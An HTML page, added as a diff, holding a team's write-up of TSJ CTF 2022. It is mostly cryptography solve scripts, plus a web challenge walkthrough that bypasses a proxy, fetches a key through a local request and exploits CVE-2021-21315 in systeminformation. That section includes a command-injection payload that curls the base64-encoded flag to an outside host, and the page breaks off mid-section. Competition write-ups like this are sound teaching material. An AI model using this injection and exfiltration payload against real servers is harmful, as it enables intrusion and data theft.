@@ -1,0 +1,1469 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>TSJ CTF 2022 Writeup | Black Bauhinia</title>
+
+<meta name="keywords" content="ctf" />
+<meta name="description" content="We played TSJ CTF last weekend and we won! This is the writeups of our challenges">
+<meta name="author" content="grhkm, harrier, Mystiz, ozetta">
+<link rel="canonical" href="https://b6a.black/posts/2022-03-03-tsjctf/" />
+<link href="/assets/css/stylesheet.min.79c4dfee3993cd3110886e38d36a5106e0d6922344cefa3ff5c0076f246815f0.css" integrity="sha256-ecTf7jmTzTEQiG4402pRBuDWkiNEzvo/9cAHbyRoFfA=" rel="preload stylesheet"
+    as="style">
+
+<link rel="icon" href="https://b6a.black/favicon.ico">
+
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<meta name="generator" content="Hugo 0.91.0" />
+
+
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-M67YZZ2MP1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-M67YZZ2MP1');
+</script>
+
+
+
+<script src="https://kit.fontawesome.com/fbbadced05.js" crossorigin="anonymous"></script>
+
+
+<link rel="preconnect" href="https://fonts.gstatic.com">
+<link href="https://fonts.googleapis.com/css2?family=Recursive&display=swap" rel="stylesheet"> 
+
+
+<meta property="og:title" content="TSJ CTF 2022 Writeup" />
+<meta property="og:description" content="We played TSJ CTF last weekend and we won! This is the writeups of our challenges" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://b6a.black/posts/2022-03-03-tsjctf/" />
+<meta property="og:image" content="https://b6a.black/images/2022-03-03-tsjctf/tsjctf.jpg" /><meta property="article:published_time" content="2022-03-06T00:00:00+08:00" />
+<meta property="article:modified_time" content="2022-03-06T00:00:00+08:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:image" content="https://b6a.black/images/2022-03-03-tsjctf/tsjctf.jpg" />
+<meta name="twitter:title" content="TSJ CTF 2022 Writeup"/>
+<meta name="twitter:description" content="We played TSJ CTF last weekend and we won! This is the writeups of our challenges"/>
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "TSJ CTF 2022 Writeup",
+  "name": "TSJ CTF 2022 Writeup",
+  "description": "We played TSJ CTF last weekend and we won! This is the writeups of our challenges",
+  "keywords": [
+    "ctf"
+  ],
+  "articleBody": "We played TSJ CTF last weekend and we won! This is the writeups of our challenges:\n    Challenge Name Category Points Writeup     Futago CSC, Crypto 56 Link   Completely Secure Cryptography CSC, Misc 116 Link   Nimja at Nantou Web 133 Link   babyRSA Crypto 276 Link   Top Secret Crypto 325 Link   Cipher Switching Service Crypto 416 Link, Mystiz's blog   Signature Crypto 469 Link, Mystiz's blog   RNG++ Crypto 213 Link   RNG+++ Crypto 469 Link   Genie Web, Crypto 500 Link   Remote Code TeXecution 1 Misc 500 Link    Futago Solved by Mystiz and grhkm; writeup compiled by grhkm.\nWe are given three different folders, each containing RSA challenges which we shall solve to get the full flag. Firstly, here is how to read the .pub files in Python:\nfrom Crypto.PublicKey import RSA key = RSA.import_key(open('key.pub', 'r').read()) print(key.n, key.e) With this in mind, let's look at each of the three stages. Note that since this is a CSC challenge, there is quite a bit of guessing involved, but I will try to explain the motivation behind each.\n Stage 1 We are given two RSA keys with $n\\sim 2^{2048}$ and $e = 65537$, so there is seemingly no obvious attack on the modulus itself. However, we can guess that the modulus $n_1$ and $n_2$ are generated with a shared prime factor i.e. $n_1 = pq_1$ and $n_2 = pq_2$. This way, we can take their $\\gcd$ to extract and factorise the modulus.\nRelevant code:\nfrom math import gcd from Crypto.Util.number import bytes_to_long, long_to_bytes p = gcd(n1, n2) q1 = n1 // p q2 = n2 // p d1 = pow(e1, -1, (p - 1) * (q1 - 1)) d2 = pow(e2, -1, (p - 1) * (q2 - 1)) c1 = open('flag.txt.key1.enc', 'rb').read() print(long_to_bytes(pow(bytes_to_long(c1), d1, n1)).decode()) # Flag: TSJ{just_several_common_rsa_tricks_combined_together_ # decrypting flag.txt.key2.enc gives the same flag Note that we have $m_1 = m_2$ for the plaintext\n Stage 2 This time, we are given $n_1 = n_2$, $e_1 = 293613$ and $e_2 = 3981$, so\n\\[\\begin{aligned} c_1 \u0026\\equiv m^{e_1} \\mod pq \\\\ c_2 \u0026\\equiv m^{e_2} \\mod pq \\end{aligned}\\]\nFrom this, it is a standard trick to try to find $k_1, k_2$ such that $k_1e_1 + k_2e_2 = 1$ using the extended euclidean algorithm, as that will give\n\\[c_1^{k_1}c_2^{k_2}\\equiv m^{k_1e_1 + k_2e_2}\\equiv m\\mod pq\\]\nHowever, here we have $\\gcd(e_1, e_2) = 3$, meaning they're not coprime. Therefore, we instead find $k_1, k_2$ such that $k_1e_1 + k_2e_2 = 3$, and $m$ from $m^3$ by taking cube roots in the integers.\nSolve script:\nimport gmpy2 from math import gcd from Crypto.PublicKey import RSA from Crypto.Util.number import bytes_to_long, long_to_bytes # import keys ... # solve k1 * e1 + k2 * e2 == 3 g, k1, k2 = gmpy2.gcdext(e1, e2) assert g == 3 and k1 * e1 + k2 * e2 == g c1 = bytes_to_long(open('flag.txt.key1.enc', 'rb').read()) c2 = bytes_to_long(open('flag.txt.key2.enc', 'rb').read()) m3 = pow(c1, k1, n1) * pow(c2, k2, n1) % n1 m = gmpy2.iroot(m3, 3)[0] print(long_to_bytes(m).decode()) # Flag: in_a_single_guessy(?)_challenge_  Stage 3 Finally, this time we are given two different $2040$-bit modulus $n_1 = 2256\\ldots 6353$ and $n_2 = 2256\\ldots 3931$, as well as $e_1 = e_2 = 65537$. As you can see, the two modulus are very close. Indeed, we have $|n_2 - n_1| \\sim 2^{1031}$. What does this mean? Well, assuming the parameters for $n_1$ is generated \"normally\", we will expect that $n_1 = p_1q_1$ where $p_1\\sim q_1$, typically with $p_1 \\[\\begin{align*} n_1 \u0026= p\\cdot q \\\\ n_2 \u0026= (p + \\epsilon_1)\\cdot (q + \\epsilon_2) \\end{align*}\\]\nThen we can expect that\n\\[n_2 - n_1 \\approx p\\epsilon_2 + q\\epsilon_1 \\approx (\\epsilon_1 + \\epsilon_2)\\cdot p \\implies \\epsilon_1 + \\epsilon_2\\approx 2^{11}\\]\nThe range is really small and we can simply bruteforce for $\\epsilon_i$ and check for a factorisation of $n_2$!\n... But wait, how do we check for a factorisation without knowing $p$ and $q$? I got stuck here in-contest but Mystiz reminded me that we have $2$ equations with $2$ unknowns, and we can write a simultaneous equation:\n\\[\\begin{cases} pq \u0026= n_1 \\\\ \\epsilon_2 p + \\epsilon_1 q \u0026= n_2 - n_1 - \\epsilon_1 \\epsilon_2 \\end{cases}\\]\nExplicitly, we get $\\epsilon_2pq = (n_2 - n_1 - \\epsilon_1\\epsilon_2)q - \\epsilon_1q^2 = \\epsilon_2 n_1$\nSolve Script:\nfor eps1, eps2 in itertools.product(map(mpz, range(2, 3000, 2)), repeat=2): a = eps1 b = eps1 * eps2 + n1 - n2 c = eps2 * n1 det = b ** 2 - 4 * a * c if det  0: continue root, exact = iroot(det, 2) if exact and (-b + root) % (2 * a) == 0: q1 = (-b + root) // (2 * a) p1 = n1 // q1 break d1 = invert(e1, (p1 - 1) * (q1 - 1)) c1 = open('flag.txt.key1.enc', 'rb').read() print(long_to_bytes(pow(bytes_to_long(c1), d1, n1)).decode()) # Flag: and_this_is_just_some_random_string_to_make_the_flag_long_enough_308c8dfa144c4f41c3dfa06b5} Final Flag: TSJ{just_several_common_rsa_tricks_combined_together_in_a_single_guessy(?)_challenge_and_this_is_just_some_random_string_to_make_the_flag_long_enough_308c8dfa144c4f41c3dfa06b5}\nCompletely Secure Cryptography Solved by Mystiz; writeup compiled by Mystiz.\nWith some time of testing, I found that the output should be generated from:\n# \"Encrypt\", of course def encrypt(m: bytes) - str: c = m for _ in range(16): c = base64.b64encode(c) return c.decode().upper() It is observed in two ways:\n base64.b64decode(b'Vm0w') == b'Vm0'  This implies that the last step should be a \"captialize\" operation, and there are a bunch of base64-encode going on.  if we encode TSJ for 16 rounds, the prefix of its output and output.txt has the highest similarity (if we are case-insensitive).  Base64 is performed 16 rounds.   From this, we can easily guess byte by byte and see how many characters are matched. Doing this greedily doesn't necessarily give us the correct flag, but we can search through the string space by recursion.\nSolution script import base64 import string with open('challenge/output.txt') as f: c = f.read() def guess(m0=b'', best=0): res = [] for u in string.printable.encode(): m1 = m0 + bytes([u]) m = m1 # Encodes the flag for _ in range(16): m = base64.b64encode(m) m = m.upper().decode() for i in range(best, len(c)): if m[i] != c[i]: break else: assert False, f'Done! The flag is {m1.decode()}' res.append((i, u)) res = sorted(res, reverse=True) if res[0][0] == best: return for best, b in res: m1 = m0 + bytes([b]) guess(m1, best) guess() # TSJ{A_Truly_Cursed_Challenge_kekw_xDoeEf+AVg\\XI[r`_w(S,~N2?Ba|tFRgsOvM]^ikhG\"jcW|z~n\u0026 bCU$-qx4Z=;9/6lwLyzYm*TpuHQ.#Jj%1)P0!d3@} Nimja at Nantou Solved by Kaiziron and Ozetta; writeup compiled by Kaiziron.\nThis is a challenge about bypassing the proxy and exploiting an outdated NodeJS library which is vulnerable to command injection.\nThe proxy will prevent some path to be accessed :\nmap /hello-from-the-world/key http://127.0.0.1:80/forbidden map /hello-from-the-world/ http://127.0.0.1:80 map /service-info/admin http://127.0.0.1:5000/forbidden map /service-info/ http://127.0.0.1:5000/ To exploit the command injection, we have to first get the key.\nThis path will return the key, if the request is made from 127.0.0.1 :\nget \"/\": var jsonheader = parseJson($request.headers.toJson) var ip = $request.ip # If x-forwarded-for exists if haskey(jsonheader[\"table\"], \"x-forwarded-for\"): var ips = jsonheader[\"table\"][\"x-forwarded-for\"] ip = ips[ips.len-1].str if ip == \"127.0.0.1\": resp getkey() else: resp \"This is the index page.\\nOnly local user can get the key.\\n\" In order to have a request made from 127.0.0.1, we can make a POST request to /get_hello :\npost \"/get_hello\": var jsonheader = parseJson($request.params.toJson) var host = \"\" if haskey(jsonheader, \"host\"): host = jsonheader[\"host\"].str if host != \"\": var response = hello_from_the_world(host) resp response else: resp \"Please provide the host so that they can say hello to you.\\n\" It can call the hello_from_the_world function, which will make the request to get the key we want, however it will append hello at the end of the URI :\nproc hello_from_the_world(host: string): string = var client = newHTTPClient(timeout=1000) var uri = host \u0026 \"hello\" var response = \"\" try: response = client.getContent(uri) except: response = \"Cannot fetch hello from your designated host.\\n\" return response We can add a ? at the end of the URI, so the hello it appended will be parsed as a parameter and won't affect the path.\nPOST /hello-from-the-world/get_hello HTTP/1.1 Host: 34.81.54.62:5487 Content-Type: application/x-www-form-urlencoded Content-Length: 26 host=http://localhost:80/? HTTP/1.1 200 OK Content-Length: 62 Server: ATS/9.1.0 Date: Sun, 27 Feb 2022 12:21:06 GMT Content-Type: text/html;charset=utf-8 Age: 0 Connection: keep-alive T$J_CTF_15_FUN__ After getting the key, we can proceed to exploit the command injection.\nThe systeminformation library is version 5.2.6.\n// cat package.json { \"name\": \"service-info\", \"version\": \"1.0.0\", \"description\": \"The package is for service-info from Nimja at Nantou\", \"main\": \"app.js\", \"scripts\": { \"test\": \"echo \\\"Error: no test specified\\\" \u0026\u0026 exit 1\" }, \"author\": \"l3o\", \"license\": \"ISC\", \"dependencies\": { \"systeminformation\": \"5.2.6\" } } It is outdated and vulnerable to command injection\nMore information about the vulnerability : https://vuldb.com/?id.169997 https://github.com/ForbiddenProgrammer/CVE-2021-21315-PoC\nThe si.services() function is vulnerable :\nfunction get_services(service) { return new Promise((res, reject) = { si.services(service) .then(data = { console.log(data); if (data != null) res(data.toString()); else res(\"Failed\"); }).catch(error = { console.error(\"Error: \" + error); reject(\"There is an error when fetching services.\"); }) }); } The /admin path will call that get_services function :\nif (request.url == \"/admin\") { if (request.method == \"POST\") { if(body) { try { var jsonData = JSON.parse(body); var service = jsonData.service; var client_key = jsonData.key; } catch (e) { response.end(\"ERROR\"); return 1; } } if (client_key == KEY) { let return_data = await get_services(service); response.end(return_data); } else { console.log(\"Key does not match.\\n\"); response.end(\"Only local users with the key can access the function.\\n\"); } } else { response.end(\"This is the admin page.\\n\"); } } else if (request.url == \"/forbidden\") { response.end(\"Only local user can access it.\\n\"); } else if (request.url == \"/\") { response.end(\"This is the index page.\\n\"); } else { response.end(\"404 Not Found\\n\"); } That /admin path is blocked by the proxy, but using double slash can bypass it /service-info//admin\nThen just follow this POC and exploit the command injection to read the flag :\nhttps://github.com/ForbiddenProgrammer/CVE-2021-21315-PoC\nPOST /service-info//admin HTTP/1.1 Host: 34.81.54.62:5487 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: close Upgrade-Insecure-Requests: 1 Cache-Control: max-age=0 Content-Type: application/json Content-Length: 159 {\"service\":[\"$(curl http://REDACTED/`base64 /flag`)\"], \"key\":\"T$J_CTF_15_FUN__ babyRSA Solved by grhkm and Mystiz; writeup compiled by Mystiz.\nChallenge Summary Let $p$ and $q$ be two primes of respectively 1024 bits and 512 bits. Denote $n = pq$ and define the elliptic curve $\\mathcal{C}$ by\n\\[\\mathcal{C}: \\quad y^2 \\equiv x^3 + px + q\\ (\\text{mod}\\ n).\\]\nLet $P = (x, y)$ be a point on $\\mathcal{C}$ with $\\text{flag}$ being 1536 bits long. Finally, we are given $Q$ with $Q = e \\cdot P$ ($e = 65537$). The goal is to recover $x$ (the padded flag).\nSolution Since $Q := (x_Q, y_Q)$ is on the elliptic curve $\\mathcal{C}$, we have\n\\[q + {x_Q}^3 - {y_Q}^2 + x_Q \\cdot p \\equiv 0\\ (\\text{mod}\\ n).\\]\nIf we multiply both sides by $q$, we have an quadratic congruence in $q$:\n\\[q^2 + ({x_Q}^3 - {y_Q}^2) \\cdot q + x_Q \\cdot n \\equiv 0\\ (\\text{mod}\\ n).\\]\nSince $q$ and $n$ are respectively 512 and 1536 bits, we have more information than unknowns. We can use LLL to recover $q$.\nAfter that, we can recover $P$ over $\\mathbb{Z}_p$ and $\\mathbb{Z}_q$ by considering the below elliptic curves:\n\\[\\begin{aligned} \u0026 \\mathcal{C}_p: \\quad y^2 \\equiv x^3 + px + q\\ (\\text{mod}\\ p) \\\\ \u0026 \\mathcal{C}_q: \\quad y^2 \\equiv x^3 + px + q\\ (\\text{mod}\\ q) \\end{aligned}\\]\nAlso, it would be easy for Sage to compute the order of those elliptic curves. In that way, we can find $d_p$ and $d_q$ such that\n\\[P = d_p \\cdot Q\\ (\\text{mod}\\ p) \\quad \\text{and} \\quad P = d_q \\cdot Q\\ (\\text{mod}\\ q).\\]\nFinally, we can use the Chinese remainder theorem to recover $P\\ \\text{mod}\\ n$. We have the flag by getting its $x$-coordinate:\nTSJ{i_don't_know_how_to_come_up_with_a_good_flag_sorry} Solution script e = 65537 n = 1084688440161525456565761297723021343753253859795834242323030221791996428064155741632924019882056914573754134213933081812831553364457966850480783858044755351020146309359045120079375683828540222710035876926280456195986410270835982861232693029200103036191096111928833090012465092747472907628385292492824489792241681880212163064150211815610372913101079146216940331740232522884290993565482822803814551730856710106385508489039042473394392081462669609250933566332939789 Qx, Qy = (1079311510414830031139310538989364057627185699077021276018232243092942690870213059161389825534830969580365943449482350229248945906866520819967957236255440270989833744079711900768144840591483525815244585394421988274792758875782239418100536145352175259508289748680619234207733291893262219468921233103016818320457126934347062355978211746913204921678806713434052571635091703300179193823668800062505275903102987517403501907477305095029634601150501028521316347448735695, 950119069222078086234887613499964523979451201727533569872219684563725731563439980545934017421736344519710579407356386725248959120187745206708940002584577645674737496282710258024067317510208074379116954056479277393224317887065763453906737739693144134777069382325155341867799398498938089764441925428778931400322389280512595265528512337796182736811112959040864126090875929813217718688941914085732678521954674134000433727451972397192521253852342394169735042490836886) load('coppersmith.sage') bounds = (2^512, ) P.q = PolynomialRing(Zmod(n), 1) f = q^2 - q * (Qy^2 - Qx^3) roots = small_roots(f, bounds, m=7) for q0, in roots: q0 = int(q0) if q0 == 0: continue if n % q0 != 0: continue print(f'{q0 = }') p0 = n // q0 Cp = EllipticCurve(Zmod(p0), [p0, q0]) op = Cp.order() print(f'{op = }') dp = int(pow(e, -1, op)) print(f'{dp = }') Qp = Cp(Qx, Qy) Pp = dp * Qp Cq = EllipticCurve(Zmod(q0), [p0, q0]) oq = Cq.order() print(f'{oq = }') dq = int(pow(e, -1, oq)) print(f'{dq = }') Qq = Cq(Qx, Qy) Pq = dq * Qq Ppx, Ppy = map(int, Pp.xy()) Pqx, Pqy = map(int, Pq.xy()) Px = int(crt([Ppx, Pqx], [p0, q0])) print(f'{Px = }') for x in range(Px, 2**1536, n): flag = x.to_bytes(1536//8, 'big') print(f'{flag = }') # TSJ{i_don't_know_how_to_come_up_with_a_good_flag_sorry} Top Secret Solved by grhkm and Mystiz; writeup compiled by grhkm.\nWe are given the source code.\nclass Cipher: bs = 16 s = 0x6BF1B9BAE2CA5BC9C7EF4BCD5AADBC47 k = 0x5C2B76970103D4EEFCD4A2C681CC400D def __init__(self, key): self.key = key def _next(self): # replacing fast_forward with forward works too self.s = fast_forward(self.s, self.key, self.k) def ks(self, n): ks = b\"\" while len(ks)  n: self._next() ks += self.s.to_bytes(self.bs, \"big\") return ks[:n] def encrypt(self, plaintext): return bytes(x ^ y for x, y in zip(plaintext, self.ks(len(plaintext)))) def decrypt(self, ciphertext): return self.encrypt(ciphertext) def forward(s, n, k): for _ in range(n): s = (s  1) ^ ((s \u0026 1) * k) return s if __name__ == \"__main__\": key = randbelow(2 ** 128) with open(\"flag.png\", \"rb\") as f: data = f.read() with open(\"flag.png.enc\", \"wb\") as f: f.write(Cipher(key).encrypt(data)) As we can see, it is a stream cipher where the flag is xor'ed by a stream with a fixed state s. First, note that the first $16$ bytes, and thus the entire first \"round\" of bits, can be recovered by xor'ing the encrypted flag with the PNG header and the IHDR chunk. Further analysing the forward function, we see that it is essentially a Galois LFSR - in short, each time the LFSR shifts, the entire state is xor'ed by a key k. If we now represent the state as a vector $\\vec{s} \\in \\mathbb{F}_2^{128}$, we can see the forward operation is\n\\[f: \\begin{pmatrix} s_0 \\\\ s_1 \\\\ \\vdots \\\\ s_{126} \\\\ s_{127} \\end{pmatrix} \\mapsto \\begin{pmatrix} s_1 \\\\ s_2 \\\\ \\vdots \\\\ s_{127} \\\\ 0 \\end{pmatrix} \\oplus s_0 \\cdot \\vec{k}\\]\nWhere $\\vec{k}$ is the constant in the source code written as a binary vector. With some linear algebra, we can write this as a matrix multiplication $\\vec{s} \\mapsto M\\vec{s}$, but we got stuck here as we thought it is impossible to solve for $M^n\\vec{s} = \\vec{t}$, because of two reasons:\n We do not have the full matrix $M^n$ Even if we do, it is infeasible to calculate discrete logarithms of $128\\times 128$ matrices.  As it turns out, both the assumptions are incorrect. Firstly, due to the special nature of $M$ being the representation of a Galois LFSR, we can treat $\\vec{s}$ as an element of $\\color{blue}{\\mathbb{F}_{2^{128}}}$, and more specifically as a polynomial. To motivate this, we can look at the following examples: (writing vectors in row form from $s0$ to $s{127}$)\n\\[\\begin{align*} f(1, 0, 0, \\ldots, 0, 0) \u0026= (0, 1, 0, \\ldots, 0, 0) \\\\ f(0, 0, 1, \\ldots, 0, 0) \u0026= f(0, 0, 1, \\ldots, 0, 0) \\\\ \u0026\\vdots \\\\ f(0, 0, 0, \\ldots 1, 0) \u0026= f(0, 0, 0, \\ldots, 0, 1) \\\\ f(0, 0, 0, \\ldots, 0, 1) \u0026= \\vec{k} \\end{align*}\\]\nFrom the cyclic nature of the operation, we can treat the vector $(s_0, s1, \\ldots, s{127})$ as polynomials in $\\mathbb{F}_{2^{128}}$ as $s_0 + s_1x + s2x^2 + \\ldots + s{127}x^{127}$ and $f(s) = xs$. Then since $x^{127}$ gets mapped to $k$ (as a polynomial), we can think of this as a modulo operation\n\\[f(s) = (xs\\mod x^{128} + k(x))\\]\nNow the idea is clear. With the first $16$ bytes i.e. $128$ bits of keystream, we can form a polynomial of the state $t$, and we get the equation\n\\[t \\equiv x^n s \\mod (x^{128} + k(x))\\]\nWe can directly compute the discrete logarithm $\\log_x(\\frac{t}{s})$. It is crucial to use pari's .fflog instead of sage's builtin .log method before Sage 9.5, as Sage uses generic PH-BSGS method to solve discrete logarithm in this case.\nThere is a final trick where $x^{128} + k(x)$ is not irreducible but instead is in the form of $xP(x)$. We simply consider discrete logarithm mod $P(x)$ and the rest follows as seen from the modulo relation.\nCode:\nk = 0x5C2B76970103D4EEFCD4A2C681CC400D init_s = 0x6BF1B9BAE2CA5BC9C7EF4BCD5AADBC47 def to_poly(s): return sum(((s  i) \u0026 1) * x^(127 - i) for i in range(128)) def to_int(r): return sum(int(x)  (127 - i) for i, x in enumerate(r.coefficients(sparse=False))) R.x = PolynomialRing(GF(2), 'x') # from other png files png_header = 0x89504e470d0a1a0a0000000d49484452 # from flag.png.enc known = 0x9995611033e8bf22ae4defce1e53b92c cur_s = to_poly(png_header ^^ known) # extract modulus modulus = R((x^128 + to_poly(k)) / x) # setup fields and convert print(modulus.factor()) Q.x = GF(2^127, modulus=modulus) cur_sQ = Q(cur_s) init_sQ = Q(to_poly(init_s)) # discrete log dlog = ZZ(pari.fflog(Q(cur_sQ / init_sQ), Q(x))) print(f\"{dlog = }\") assert Q(x)^dlog * init_sQ == Q(cur_sQ) # however, calculations have to be done in the original modulus modulus *= R(x) cur_s = R(to_poly(init_s)) # decrypt flag enc = open('flag.png.enc', 'rb').read() keystream = b\"\" while len(keystream)  len(enc): cur_s = cur_s * pow(R(x), dlog, modulus) % modulus keystream += to_int(cur_s).to_bytes(16, \"big\") dec = bytes([x ^^ y for x, y in zip(enc, keystream)]) open('flag.png', 'wb').write(dec) Flag: TSJ{discrete_log_in_a_finite_field}\nCipher Switching Service Solved by Mystiz; writeup compiled by Mystiz.\nhttps://mystiz.hk/posts/2022-03-01-tsjctf-1/ (will copy the content here as well)\nSignature Solved by Mystiz; writeup compiled by Mystiz.\nhttps://mystiz.hk/posts/2022-03-02-tsjctf-2/ (will copy the content here as well)\nRNG++ Solved by Mystiz; writeup compiled by grhkm and Mystiz.\nChallenge Summary Suppose that we have a linear congruence generator $s_{k+1} = (a \\cdot s_k + c)\\ (\\text{mod}\\ m)$ for all $k \\geq 0$. We have a transcript file that contains $m$, $a$ and $c$ ($a$ and $c$ are primes less than $m$). We are also given a number of ciphertexts. The $k$-th ciphertext $c_k$ ($k \\geq 1$) is computed by:\n\\[c_k = m_k \\oplus s_k.\\]\nHere $m_k$ is the $k$-th message. $m_1$ is the flag with length $l$ and $m_2, m_3, ...$ are strings of length $l$ those contain digits only (for example, m2 = b\"133765536\"). The goal is to recover $m_1$.\nIn this challenge, the parameters are given below:\nl = 32 # m = 2^256 m = 115792089237316195423570985008687907853269984665640564039457584007913129639936 a = 86063744400850297667628777812749377798737932751281716573108946773081904916117 c = 64628347935200268328771003490390752890895505335867420334664237461501166025747 ciphertexts = [ 0x59fe4b12f3f85e6756189ba75cc7bfc6ebc5b9a9e0f008623dd008f9632927c2, 0x413c3d70d09e08d2e5b10b51800b65571f3afde82ca233351cddae591c3996d2, 0xea4aac7bf92c87cad6584d4cd8337af93afc2fd42314c02298afcdd26ec42771, 0x8c6425226df355ccd09cc5c968b3cfa8fd606179346a66841ee5b7f6e6425409, 0x16cd6c30d1bff2dc1ba2e6257fb37fd5c477d0952e254aa3c5c301b0e43846c8 ] Solution As noted, we notice that the random strings $m_i, i\\geq 2$ consists of digits only. We further note that since the modulus $m = 2^{256}$ is a power of $2$, we have that\n\\[m_1 \\oplus (AS + C) \\equiv c_1 \\mod 2^{256}\\]\n\\[\\implies \\begin{cases} m_1[:1] \\oplus (AS + C\\mod 2^8) \u0026\\equiv c_1 \\mod 2^8 \\\\ m_1[:2] \\oplus (AS + C\\mod 2^{16}) \u0026\\equiv c_1 \\mod 2^{16} \\\\ m_1[:3] \\oplus (AS + C\\mod 2^{24}) \u0026\\equiv c_1 \\mod 2^{24} \\\\ \u0026\\vdots \\end{cases}\\]\nWhere $S' \\in [0, 2^{8i}]$ is the restricted $S$, and equations are similar for $m_2, m_3, m_4$. Therefore, we can test $i = 1, 2, \\ldots, 32$, bruteforce the corresponding character $c_1[i]$ (which has $10$ choices), and use recursion.\nSolution script m = 2**256 a = 86063744400850297667628777812749377798737932751281716573108946773081904916117 c = 64628347935200268328771003490390752890895505335867420334664237461501166025747 cs = [ 0x59fe4b12f3f85e6756189ba75cc7bfc6ebc5b9a9e0f008623dd008f9632927c2, 0x413c3d70d09e08d2e5b10b51800b65571f3afde82ca233351cddae591c3996d2, 0xea4aac7bf92c87cad6584d4cd8337af93afc2fd42314c02298afcdd26ec42771, 0x8c6425226df355ccd09cc5c968b3cfa8fd606179346a66841ee5b7f6e6425409, 0x16cd6c30d1bff2dc1ba2e6257fb37fd5c477d0952e254aa3c5c301b0e43846c8, ] nums = set(b'0123456789') def attempt(current=0, progress=0): if progress == 32: m1 = current s1 = m1 ^ cs[1] s0 = pow(a, -1, m) * (s1 - c) % m m0 = s0 ^ cs[0] flag = int.to_bytes(m0, progress, 'big') print(f'{flag = }') return mod = 256**(progress + 1) for x in range(10): m1 = current + 256**progress * (0x30 + x) s1 = (m1 ^ cs[1]) % mod s2 = (a * s1 + c) % mod m2 = (s2 ^ cs[2]) % mod if set(int.to_bytes(m2, progress+1, 'big')) | nums != nums: continue s3 = (a * s2 + c) % mod m3 = (s3 ^ cs[3]) % mod if set(int.to_bytes(m3, progress+1, 'big')) | nums != nums: continue s4 = (a * s3 + c) % mod m4 = (s4 ^ cs[4]) % mod if set(int.to_bytes(m4, progress+1, 'big')) | nums != nums: continue attempt(m1, progress+1) attempt() # TSJ{this_is_a_boring_challenge_sorry} RNG+++ Solved by Mystiz; writeup compiled by Mystiz.\nChallenge Summary The challenge has the same setting as RNG++ with a different set of parameters:\nl = 24 # m = 2^192 + 133 = NextPrime(2^192) m = 6277101735386680763835789423207666416102355444464034513029 a = 5122535491606943208710238231068027098883286375061143870757 c = 3210047385276654404868184757570927620150853542689320481571 ciphertexts = [ 0x0b8bb965128d77d56f2efc1b7ec640699927dbb711d13a41, 0x5c894788bdf78b2b7bf4081270ebb495b95c90ab6a7fb3f0, 0x737d9ea03e9fd30eeb2176aa588480c0b798682a7f4013fc, 0x299bd16cef01a65b467d5e3dfd46ec62b4e29f8994b1a4c0, 0xaa9b3e5f5635b7cab0eaa50aa854223975bfc10976a5b198, 0xdfdcac905116a9f8ac0fb9bdf8da193616b58713daa7dade, 0x520b8ea46a7ad0a590064b6f067b9b3962c4874541eb34f0, 0xa490b4afaf268540b0ecafff938b4531ad06b5706a4d68e6, 0x087726f7bf592ad0ee92e78773dc860f4975766f382bf192 ] Solution The idea is similar to Signature, which attempts to remove XOR operations of a relation and convert it to affine relation. The below script would recover the seed $s_0$ from ciphertexts.\nThe weights are pretty hard to set though… @maple3142 used BKZ and it would return a better set of vectors, effectively recovering $s_0$ without much configuration to the weights.  After we have the seed recovered from LLL, we can decrypt $c_1$ and yield the flag:\nTSJ{sorry_for_the_broken_ver} Solution script m = 6277101735386680763835789423207666416102355444464034513029 # 2^192 + 133 a = 5122535491606943208710238231068027098883286375061143870757 c = 3210047385276654404868184757570927620150853542689320481571 cs = list(map(int, [ 0x0b8bb965128d77d56f2efc1b7ec640699927dbb711d13a41, 0x5c894788bdf78b2b7bf4081270ebb495b95c90ab6a7fb3f0, 0x737d9ea03e9fd30eeb2176aa588480c0b798682a7f4013fc, 0x299bd16cef01a65b467d5e3dfd46ec62b4e29f8994b1a4c0, 0xaa9b3e5f5635b7cab0eaa50aa854223975bfc10976a5b198, 0xdfdcac905116a9f8ac0fb9bdf8da193616b58713daa7dade, 0x520b8ea46a7ad0a590064b6f067b9b3962c4874541eb34f0, 0xa490b4afaf268540b0ecafff938b4531ad06b5706a4d68e6, 0x087726f7bf592ad0ee92e78773dc860f4975766f382bf192, ])) n = len(cs)-1 P.s0 = PolynomialRing(GF(m)) ss = [s0] while len(ss)-1  len(cs): ss.append(a * ss[-1] + c) try: ss[-1] = ss[-1] % m except: pass ss = ss[1:] MASK = int.from_bytes(b'0'*24, 'big') weights = [2^256 for _ in range(8)] # all zeros weights += [2^192, 1] # 1, s0 (192 bit) weights += [2^192 for _ in range(24*8)] # rki's (-15 ~ 15) A = Matrix(ZZ, 2 + 25*n) Q = diagonal_matrix(weights) for j in range(n): vj, uj = map(int, ss[j+1].coefficients()) if True: A[0, j] = vj - (cs[j+1]^^MASK) A[1, j] = uj for i in range(24): A[2+24*j+i, j] = 256**i if True: A[2+24*n+j, j] = m for i in range(2 + 24*n): A[i, n+i] = 1 A *= Q A = A.LLL() A /= Q for row in A: if list(row[:n]) != [0 for _ in range(n)]: continue if row[n]  0: row = -row if row[n] != 1: continue s0 = int(row[n+1] % m) rs = row[n+2:] if min(rs)  -15: continue if max(rs)  15: continue print(f'{s0 = }') print(f'{rs = }') print() Genie Solved by grkhm, Mystiz and Ozetta; writeup compiled by Mystiz and Ozetta.\nThe challenge is a website developed using Genie Framework, which is based on Julia. The website allows user to upload files and it stores the file list to the session.\nThe first steps From Mystiz's perspective\nI noticed this challenge after it is tagged with \"crypto\". Since the source code for the web server (main.jl) is pretty short, I suspect that we should be looking for a bug from the Genie framework.\nOne use of crypto in Genie is their cookie-session management. In short, cookies are ciphertexts of the session ID. The session ID corresponds to a file in the /app/sessions folder. In pseudocode:\n# key and iv are fixed cookie = 